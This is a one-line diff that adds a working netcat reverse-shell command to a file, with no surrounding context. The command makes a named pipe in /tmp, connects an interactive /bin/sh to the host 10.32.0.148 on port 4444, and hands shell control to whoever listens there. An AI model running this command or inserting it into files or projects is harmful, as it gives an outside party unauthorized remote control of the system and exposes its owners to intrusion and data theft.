@@ -1,0 +1,1 @@
+rm -rf /tmp/p; mkfifo /tmp/p;cat /tmp/p | /bin/sh -i 2>&1 | nc 10.32.0.148 4444 > /tmp/p
